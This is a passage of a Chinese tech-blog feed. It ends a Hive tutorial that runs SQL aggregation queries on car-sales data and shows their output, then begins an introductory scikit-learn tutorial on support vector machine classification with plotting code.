class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">hive (cars)<span class="operator">&gt;</span> <span class="keyword">select</span> model,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> cnt <span class="keyword">from</span> cars.car_2019712 <span class="keyword">group</span> <span class="keyword">by</span> model <span class="keyword">order</span> <span class="keyword">by</span> cnt <span class="keyword">desc</span> limit <span class="number">10</span>;</span><br><span class="line">MapReduce Jobs Launched: </span><br><span class="line">Stage<span class="operator">-</span>Stage<span class="number">-1</span>:  HDFS Read: <span class="number">331331684</span> HDFS Write: <span class="number">114251</span> SUCCESS</span><br><span class="line">Stage<span class="operator">-</span>Stage<span class="number">-2</span>:  HDFS Read: <span class="number">331400570</span> HDFS Write: <span class="number">155657</span> SUCCESS</span><br><span class="line">Total MapReduce CPU <span class="type">Time</span> Spent: <span class="number">0</span> msec</span><br><span class="line">OK</span><br><span class="line">modelcnt</span><br><span class="line">LZW6376NF<span class="number">13727</span></span><br><span class="line">LZW6407BAF<span class="number">6357</span></span><br><span class="line">LZW6390QF<span class="number">5967</span></span><br><span class="line">LZW6388NF<span class="number">5120</span></span><br><span class="line">LZW6432KF<span class="number">4097</span></span><br><span class="line">LZW6431MF<span class="number">3622</span></span><br><span class="line">EQ6361PF6<span class="number">2509</span></span><br><span class="line">SC6363B4S<span class="number">2234</span></span><br><span class="line">LZW6430KF<span class="number">1484</span></span><br><span class="line">LZW6390NF<span class="number">1396</span></span><br><span class="line"><span class="type">Time</span> taken: <span class="number">4.495</span> seconds, Fetched: <span class="number">10</span> <span class="type">row</span>(s)</span><br></pre></td></tr></table></figure><ol start="3"><li>统计车辆类型<br>根据车辆类型字段 vehicletype 进行分组统计</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">hive (cars)<span class="operator">&gt;</span> <span class="keyword">select</span> vehicletype,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> cnt <span class="keyword">from</span> cars.car_2019712 <span class="keyword">group</span> <span class="keyword">by</span> vehicletype <span class="keyword">order</span> <span class="keyword">by</span> cnt <span class="keyword">desc</span> limit <span class="number">10</span>; </span><br><span class="line">MapReduce Jobs Launched: </span><br><span class="line">Stage<span class="operator">-</span>Stage<span class="number">-1</span>:  HDFS Read: <span class="number">372809322</span> HDFS Write: <span class="number">156530</span> SUCCESS</span><br><span class="line">Stage<span class="operator">-</span>Stage<span class="number">-2</span>:  HDFS Read: <span class="number">372817774</span> HDFS Write: <span class="number">167935</span> SUCCESS</span><br><span class="line">Total MapReduce CPU <span class="type">Time</span> Spent: <span class="number">0</span> msec</span><br><span class="line">OK</span><br><span class="line">vehicletypecnt</span><br><span class="line">小型普通客车<span class="number">62156</span></span><br><span class="line"><span class="number">3276</span></span><br><span class="line">大型普通客车<span class="number">3275</span></span><br><span class="line">中型普通客车<span class="number">1398</span></span><br><span class="line"><span class="keyword">NULL</span><span class="number">273</span></span><br><span class="line">大型专用校车<span class="number">221</span></span><br><span class="line">中型专用校车<span class="number">29</span></span><br><span class="line">小型专用客车<span class="number">5</span></span><br><span class="line">大型铰接客车<span class="number">3</span></span><br><span class="line">微型普通客车<span class="number">2</span></span><br><span class="line"><span class="type">Time</span> taken: <span class="number">4.15</span> seconds, Fetched: <span class="number">10</span> <span class="type">row</span>(s)</span><br></pre></td></tr></table></figure><ol start="4"><li>统计所有权、车辆型号和车辆类型<br>统计车辆的 3 个维度：所有权、车辆型号和车辆类型。</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">hive (cars)<span class="operator">&gt;</span> <span class="keyword">select</span> a.cnt,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> (<span class="keyword">select</span> concat(model,ownership,vehicletype) <span class="keyword">as</span> cnt <span class="keyword">from</span> cars.car_2019712) a <span class="keyword">group</span> <span class="keyword">by</span> a.cnt;</span><br><span class="line">Stage<span class="operator">-</span>Stage<span class="number">-1</span>:  HDFS Read: <span class="number">455821028</span> HDFS Write: <span class="number">358380</span> SUCCESS</span><br><span class="line">Total MapReduce CPU <span class="type">Time</span> Spent: <span class="number">0</span> msec</span><br><span class="line">OK</span><br><span class="line">a.cnt_c1</span><br><span class="line"><span class="keyword">NULL</span><span class="number">273</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line">BFC6120B<span class="number">-1</span>单位大型普通客车<span class="number">7</span></span><br><span class="line">BFC6120B2单位大型普通客车<span class="number">1</span></span><br><span class="line">BFC6900<span class="number">-2</span>单位大型普通客车<span class="number">8</span></span><br><span class="line">BJ6102U8LHB单位大型普通客车<span class="number">1</span></span><br><span class="line">BJ6103U7MHB单位大型普通客车<span class="number">1</span></span><br><span class="line">BJ6103U8LHB<span class="number">-4</span>单位大型普通客车<span class="number">3</span></span><br><span class="line">BJ6110U7LCB<span class="number">-1</span>单位大型普通客车<span class="number">6</span></span><br><span class="line">BJ6115U7AJB<span class="number">-1</span>单位大型普通客车<span class="number">1</span></span><br><span class="line">...</span><br><span class="line">ZQ6420A73F个人小型普通客车<span class="number">63</span></span><br><span class="line">ZQ6420A73F单位小型普通客车<span class="number">8</span></span><br><span class="line">ZQ6421A73AF个人小型普通客车<span class="number">17</span></span><br><span class="line">ZQ6421A73AF单位小型普通客车<span class="number">3</span></span><br><span class="line">ZZY6530A个人小型普通客车<span class="number">6</span></span><br><span class="line">ZZY6530A单位小型普通客车<span class="number">2</span></span><br><span class="line"><span class="type">Time</span> taken: <span class="number">1.686</span> seconds, Fetched: <span class="number">1290</span> <span class="type">row</span>(s)</span><br></pre></td></tr></table></figure><h3 id="统计不同类型车在一个月对应一段时间如每月或每年的总销售"><a class="markdownIt-Anchor" href="#统计不同类型车在一个月对应一段时间如每月或每年的总销售">#</a> 统计不同类型车在一个月（对应一段时间，如每月或每年) 的总销售</h3><p>统计不同类型车在一个月的总销量。也就是统计某一年某一个月某一类型的车，如大型普通客车、小型普通客车等，销售了多少辆。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hive (cars)<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">month</span>,vehicletype,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> cars.car_2019712 <span class="keyword">group</span> <span class="keyword">by</span> vehicletype, <span class="keyword">month</span> <span class="keyword">having</span> <span class="keyword">month</span> <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">and</span> vehicletype <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">and</span> vehicletype<span class="operator">!=</span><span class="string">&#x27;&#x27;</span>;</span><br><span class="line">MapReduce Jobs Launched: </span><br><span class="line">Stage<span class="operator">-</span>Stage<span class="number">-1</span>:  HDFS Read: <span class="number">497227388</span> HDFS Write: <span class="number">362693</span> SUCCESS</span><br><span class="line">Total MapReduce CPU <span class="type">Time</span> Spent: <span class="number">0</span> msec</span><br><span class="line">OK</span><br><span class="line"><span class="keyword">month</span>vehicletype_c2</span><br><span class="line"><span class="number">1</span>中型普通客车<span class="number">157</span></span><br><span class="line"><span class="number">1</span>大型专用校车<span class="number">4</span></span><br><span class="line"><span class="number">1</span>大型普通客车<span class="number">529</span></span><br><span class="line">...</span><br><span class="line"><span class="number">12</span>大型专用校车<span class="number">8</span></span><br><span class="line"><span class="number">12</span>大型普通客车<span class="number">482</span></span><br><span class="line"><span class="number">12</span>小型普通客车<span class="number">6701</span></span><br><span class="line"><span class="type">Time</span> taken: <span class="number">2.054</span> seconds, Fetched: <span class="number">64</span> <span class="type">row</span>(s)</span><br></pre></td></tr></table></figure><h3 id="通过不同类型品牌车销售情况来统计发动机型号和燃料种类"><a class="markdownIt-Anchor" href="#通过不同类型品牌车销售情况来统计发动机型号和燃料种类">#</a> 通过不同类型 (品牌) 车销售情况，来统计发动机型号和燃料种类</h3><p>通过不同类型（品牌）车销售情况，统计发动机型号和燃料种类。也就是按车辆的品牌字段 brand、发动机型号字段 enginemodel 和燃油种类字段 fuel 进行分组统计。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">hive (cars)<span class="operator">&gt;</span> <span class="keyword">select</span> brand,enginemodel,fuel,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> cars.car_2019712 <span class="keyword">group</span> <span class="keyword">by</span> brand,enginemodel,fuel;</span><br><span class="line">MapReduce Jobs Launched: </span><br><span class="line">Stage<span class="operator">-</span>Stage<span class="number">-1</span>:  HDFS Read: <span class="number">580122636</span> HDFS Write: <span class="number">444919</span> SUCCESS</span><br><span class="line">Total MapReduce CPU <span class="type">Time</span> Spent: <span class="number">0</span> msec</span><br><span class="line">OK</span><br><span class="line">brandenginemodelfuel_c3</span><br><span class="line">...</span><br><span class="line">黄海YC6J245<span class="number">-30</span>柴油<span class="number">17</span></span><br><span class="line">黄海YC6J245<span class="number">-42</span>柴油<span class="number">2</span></span><br><span class="line">黄海YC6L330<span class="number">-30</span>柴油<span class="number">1</span></span><br><span class="line"><span class="type">Time</span> taken: <span class="number">1.765</span> seconds, Fetched: <span class="number">757</span> <span class="type">row</span>(s)</span><br></pre></td></tr></table></figure><h3 id="统计五菱某一年每月的销售量"><a class="markdownIt-Anchor" href="#统计五菱某一年每月的销售量">#</a> 统计五菱某一年每月的销售量</h3><p>统计五菱汽车某一年每月的销售量，可以按汽车的品牌 brand 和月 month 两个字段进行分组统计，并从结果中将品牌名为 “五菱” 的数据过滤出来即可。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">hive (cars)<span class="operator">&gt;</span> <span class="keyword">select</span> brand,<span class="keyword">month</span>,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> cars.car_2019712 <span class="keyword">group</span> <span class="keyword">by</span> brand,<span class="keyword">month</span> <span class="keyword">having</span> brand<span class="operator">=</span><span class="string">&#x27;五菱&#x27;</span>;</span><br><span class="line">MapReduce Jobs Launched: </span><br><span class="line">Stage<span class="operator">-</span>Stage<span class="number">-1</span>:  HDFS Read: <span class="number">621528450</span> HDFS Write: <span class="number">445834</span> SUCCESS</span><br><span class="line">Total MapReduce CPU <span class="type">Time</span> Spent: <span class="number">0</span> msec</span><br><span class="line">OK</span><br><span class="line">brand<span class="keyword">month</span>_c2</span><br><span class="line">五菱<span class="number">1</span><span class="number">5589</span></span><br><span class="line">五菱<span class="number">2</span><span class="number">2226</span></span><br><span class="line">五菱<span class="number">3</span><span class="number">3557</span></span><br><span class="line">五菱<span class="number">4</span><span class="number">2389</span></span><br><span class="line">五菱<span class="number">5</span><span class="number">3351</span></span><br><span class="line">五菱<span class="number">6</span><span class="number">2302</span></span><br><span class="line">五菱<span class="number">7</span><span class="number">2893</span></span><br><span class="line">五菱<span class="number">8</span><span class="number">2980</span></span><br><span class="line">五菱<span class="number">9</span><span class="number">3422</span></span><br><span class="line">五菱<span class="number">10</span><span class="number">5278</span></span><br><span class="line">五菱<span class="number">11</span><span class="number">4809</span></span><br><span class="line">五菱<span class="number">12</span><span class="number">4963</span></span><br><span class="line"><span class="type">Time</span> taken: <span class="number">1.863</span> seconds, Fetched: <span class="number">12</span> <span class="type">row</span>(s)</span><br></pre></td></tr></table></figure><h2 id="本章小结"><a class="markdownIt-Anchor" href="#本章小结">#</a> 本章小结</h2><p>本章通过汽车销售数据项目让大家感受了企业大数据项目的开发流程。</p>]]></content>
      
      
      <categories>
          
          <category> Hive </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大数据 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于支持向量机的分类预测</title>
      <link href="/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%9F%BA%E4%BA%8E%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA%E7%9A%84%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/"/>
      <url>/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%9F%BA%E4%BA%8E%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA%E7%9A%84%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="1-前言"><a class="markdownIt-Anchor" href="#1-前言">#</a> 1 前言</h1><p>支持向量机（Support Vector Machine，SVM）是一个非常优雅的算法，具有非常完善的数学理论，常用于数据分类，也可以用于数据的回归预测中，由于其其优美的理论保证和利用核函数对于线性不可分问题的处理技巧，在上世纪 90 年代左右，SVM 曾红极一时。</p><p>本文将不涉及非常严格和复杂的理论知识，力求于通过直觉来感受 SVM。</p><h1 id="2-学习目标"><a class="markdownIt-Anchor" href="#2-学习目标">#</a> 2 学习目标</h1><p>了解支持向量机的分类标准；<br>了解支持向量机的软间隔分类；<br>了解支持向量机的非线性核函数分类；</p><h1 id="3-代码流程"><a class="markdownIt-Anchor" href="#3-代码流程">#</a> 3 代码流程</h1><h4 id="demo实践"><a class="markdownIt-Anchor" href="#demo实践">#</a> Demo 实践</h4><ul><li>Step1: 库函数导入</li><li>Step2: 构建数据集并进行模型训练</li><li>Step3: 模型参数查看</li><li>Step4: 模型预测</li><li>Step5: 模型可视化</li></ul><h1 id="4-算法实战"><a class="markdownIt-Anchor" href="#4-算法实战">#</a> 4. 算法实战</h1><h2 id="41-demo实践"><a class="markdownIt-Anchor" href="#41-demo实践">#</a> 4.1 Demo 实践</h2><p>首先我们利用 sklearn 直接调用 SVM 函数进行实践尝试</p><p><strong>Step1: 库函数导入</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##  基础函数库</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np </span><br><span class="line"></span><br><span class="line"><span class="comment">## 导入画图库</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"></span><br><span class="line"><span class="comment">## 导入逻辑回归模型函数</span></span><br><span class="line"><span class="keyword">from</span> sklearn  <span class="keyword">import</span> svm</span><br></pre></td></tr></table></figure><p><strong>Step2: 构建数据集并进行模型训练</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##Demo演示LogisticRegression分类</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 构造数据集</span></span><br><span class="line">x_fearures = np.array([[-<span class="number">1</span>, -<span class="number">2</span>], [-<span class="number">2</span>, -<span class="number">1</span>], [-<span class="number">3</span>, -<span class="number">2</span>], [<span class="number">1</span>, <span class="number">3</span>], [<span class="number">2</span>, <span class="number">1</span>], [<span class="number">3</span>, <span class="number">2</span>]])</span><br><span class="line">y_label = np.array([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">## 调用SVC模型 （支持向量机分类）</span></span><br><span class="line">svc = svm.SVC(kernel=<span class="string">&#x27;linear&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 用SVM模型拟合构造的数据集</span></span><br><span class="line">svc = svc.fit(x_fearures, y_label) </span><br></pre></td></tr></table></figure><p><strong>Step3: 模型参数查看</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 查看其对应模型的w</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the weight of Logistic Regression:&#x27;</span>,svc.coef_)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 查看其对应模型的w0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the intercept(w0) of Logistic Regression:&#x27;</span>,svc.intercept_)</span><br></pre></td></tr></table></figure><pre><code>the weight of Logistic Regression: [[0.33364706 0.33270588]]the intercept(w0) of Logistic Regression: [-0.00031373]</code></pre><p><strong>Step4: 模型预测</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 模型预测</span></span><br><span class="line">y_train_pred = svc.predict(x_fearures)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The predction result:&#x27;</span>,y_train_pred)</span><br></pre></td></tr></table></figure><pre><code>The predction result: [0 0 0 1 1 1]</code></pre><p><strong>Step5: 模型可视化</strong></p><p>由于此处选择的线性核函数，所以在此我们可以将 svm 进行可视化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 最佳函数</span></span><br><span class="line">x_range = np.linspace(-<span class="number">3</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">w = svc.coef_[<span class="number">0</span>]</span><br><span class="line">a = -w[<span class="number">0</span>] / w[<span class="number">1</span>]</span><br><span class="line">y_3 = a*x_range - (svc.intercept_[<span class="number">0</span>]) / w[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可视化决策边界</span></span><br><span class="line">plt.figure()</span><br><span class="line">plt.scatter(x_fearures[:,<span class="number">0</span>],x_fearures[:,<span class="number">1</span>], c=y_label, s=<span class="number">50</span>, cmap=<span class="string">&#x27;viridis&#x27;</span>)</span><br><span class="line">plt.plot(x_range, y_3, <span class="string">&#x27;-c&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_9_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>可以对照之前的逻辑回归模型的决策边界，我们可以发现两个决策边界是有一定差异的（可以对比两者在 X,Y 轴上的截距），这说明这两个不同在相同数据集上找到的判别线是不同的，而这不同的原因其实是由于两者选择的最优目标是不一致的。接下来我们进行 SVM 的一些简单介绍。</p><h1 id="5支持向量机介绍"><a class="markdownIt-Anchor" href="#5支持向量机介绍">#</a> 5 支持向量机介绍</h1><p>我们常常会碰到这样的一个问题，首先给你一些分属于两个类别的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_blobs</span><br><span class="line">%matplotlib inline</span><br><span class="line"></span><br><span class="line"><span class="comment"># 画图</span></span><br><span class="line">X, y = make_blobs(n_samples=<span class="number">60</span>, centers=<span class="number">2</span>, random_state=<span class="number">0</span>, cluster_std=<span class="number">0.4</span>)</span><br><span class="line">plt.scatter(X[:, <span class="number">0</span>], X[:, <span class="number">1</span>], c=y, s=<span class="number">60</span>, cmap=plt.cm.Paired)</span><br></pre></td></tr></table></figure><pre><code>&lt;matplotlib.collections.PathCollection at 0x1d050096a58&gt;</code></pre><p>​<br><img "" class="lazyload placeholder" data-original="output_11_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>现在需要一个线性分类器，将这些数据分开来。</p><p>我们可能会有多种分法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 画散点图</span></span><br><span class="line">X, y = make_blobs(n_samples=<span class="number">60</span>, centers=<span class="number">2</span>, random_state=<span class="number">0</span>, cluster_std=<span class="number">0.4</span>)</span><br><span class="line"></span><br><span class="line">plt.scatter(X[:, <span class="number">0</span>], X[:, <span class="number">1</span>], c=y, s=<span class="number">50</span>, cmap=plt.cm.Paired)</span><br><span class="line"></span><br><span class="line">x_fit = np.linspace(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment"># 画函数</span></span><br><span class="line">y_1 = <span class="number">1</span> * x_fit + <span class="number">0.8</span></span><br><span class="line">plt.plot(x_fit, y_1, <span class="string">&#x27;-c&#x27;</span>)</span><br><span class="line">y_2 = -<span class="number">0.3</span> * x_fit + <span class="number">3</span></span><br><span class="line">plt.plot(x_fit, y_2, <span class="string">&#x27;-k&#x27;</span>)</span><br></pre></td></tr></table></figure><pre><code>[&lt;matplotlib.lines.Line2D at 0x1d05011bf28&gt;]</code></pre><p>​<br><img "" class="lazyload placeholder" data-original="output_13_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>那么现在有一个问题，两个分类器，哪一个更好呢？</p><p>为了判断好坏，我们需要引入一个准则：好的分类器不仅仅是能够很好的分开已有的数据集，还能对未知数据集进行两个的划分。</p><p>假设，现在有一个属于红色数据点的新数据（3， 2.8）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 画散点图</span></span><br><span class="line">X, y = make_blobs(n_samples=<span class="number">60</span>, centers=<span class="number">2</span>, random_state=<span class="number">0</span>, cluster_std=<span class="number">0.4</span>)</span><br><span class="line">plt.scatter(X[:, <span class="number">0</span>], X[:, <span class="number">1</span>], c=y, s=<span class="number">50</span>, cmap=plt.cm.Paired)</span><br><span class="line">plt.scatter([<span class="number">3</span>], [<span class="number">2.8</span>], c=<span class="string">&#x27;#cccc00&#x27;</span>, marker=<span class="string">&#x27;&lt;&#x27;</span>, s=<span class="number">100</span>, cmap=plt.cm.Paired)</span><br><span class="line"></span><br><span class="line">x_fit = np.linspace(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 画函数</span></span><br><span class="line">y_1 = <span class="number">1</span> * x_fit + <span class="number">0.8</span></span><br><span class="line">plt.plot(x_fit, y_1, <span class="string">&#x27;-c&#x27;</span>)</span><br><span class="line">y_2 = -<span class="number">0.3</span> * x_fit + <span class="number">3</span></span><br><span class="line">plt.plot(x_fit, y_2, <span class="string">&#x27;-k&#x27;</span>)</span><br></pre></td></tr></table></figure><pre><code>[&lt;matplotlib.lines.Line2D at 0x1d050163470&gt;]</code></pre><p>​<br><img "" class="lazyload placeholder" data-original="output_15_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>可以看到，此时黑色的线会把这个新的数据集分错，而蓝色的线不会。</p><p>我们刚刚举的例子可能会带有一些主观性。</p><p>那么如何客观的评判两条线的健壮性呢？</p><p>此时，我们需要引入一个非常重要的概念：最大间隔。</p><p>最大间隔刻画着当前分类器与数据集的边界，以这两个分类器为例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 画散点图</span></span><br><span class="line">X, y = make_blobs(n_samples=<span class="number">60</span>, centers=<span class="number">2</span>, random_state=<span class="number">0</span>, cluster_std=<span class="number">0.4</span>)</span><br><span class="line">plt.scatter(X[:, <span class="number">0</span>], X[:, <span class="number">1</span>], c=y, s=<span class="number">50</span>, cmap=plt.cm.Paired)</span><br><span class="line"></span><br><span class="line">x_fit = np.linspace(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 画函数</span></span><br><span class="line">y_1 = <span class="number">1</span> * x_fit + <span class="number">0.8</span></span><br><span class="line">plt.plot(x_fit, y_1, <span class="string">&#x27;-c&#x27;</span>)</span><br><span class="line"><span class="comment"># 画边距</span></span><br><span class="line">plt.fill_between(x_fit, y_1 - <span class="number">0.6</span>, y_1 + <span class="number">0.6</span>, edgecolor=<span class="string">&#x27;none&#x27;</span>, color=<span class="string">&#x27;#AAAAAA&#x27;</span>,</span><br><span class="line">                 alpha=<span class="number">0.4</span>)</span><br><span class="line"></span><br><span class="line">y_2 = -<span class="number">0.3</span> * x_fit + <span class="number">3</span></span><br><span class="line">plt.plot(x_fit, y_2, <span class="string">&#x27;-k&#x27;</span>)</span><br><span class="line">plt.fill_between(x_fit, y_2 - <span class="number">0.4</span>, y_2 + <span class="number">0.4</span>, edgecolor=<span class="string">&#x27;none&#x27;</span>, color=<span class="string">&#x27;#AAAAAA&#x27;</span>, </span><br><span class="line">                 alpha=<span class="number">0.4</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>&lt;matplotlib.collections.PolyCollection at 0x1d05021dba8&gt;</code></pre><p>​<br><img "" class="lazyload placeholder" data-original="output_17_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>可以看到， 蓝色的线最大间隔是大于黑色的线的。<br>所以我们会选择蓝色的线作为我们的分类器。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 画散点图</span></span><br><span class="line">X, y = make_blobs(n_samples=<span class="number">60</span>, centers=<span class="number">2</span>, random_state=<span class="number">0</span>, cluster_std=<span class="number">0.4</span>)</span><br><span class="line">plt.scatter(X[:, <span class="number">0</span>], X[:, <span class="number">1</span>], c=y, s=<span class="number">50</span>, cmap=plt.cm.Paired)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 画图</span></span><br><span class="line">y_1 = <span class="number">1</span> * x_fit + <span class="number">0.8</span></span><br><span class="line">plt.plot(x_fit, 